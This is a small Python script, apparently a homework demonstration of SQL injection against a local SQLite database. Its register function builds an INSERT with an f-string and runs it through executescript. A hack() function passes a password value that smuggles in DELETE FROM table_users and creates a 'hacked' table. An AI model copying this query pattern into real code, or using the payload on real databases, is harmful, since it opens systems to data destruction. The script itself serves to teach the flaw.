import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username = "I like"
    password = (
        """SQL Injection'); DELETE FROM table_users;
        CREATE TABLE IF NOT EXISTS table_users2 (id INTEGER PRIMARY KEY, username TEXT NOT NULL, 
        password TEXT NOT NULL); INSERT INTO 'table_users2' (username, password) VALUES
        ('you database', 'is hacked'); --"""
    )
    register(username, password)


if __name__ == '__main__':
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
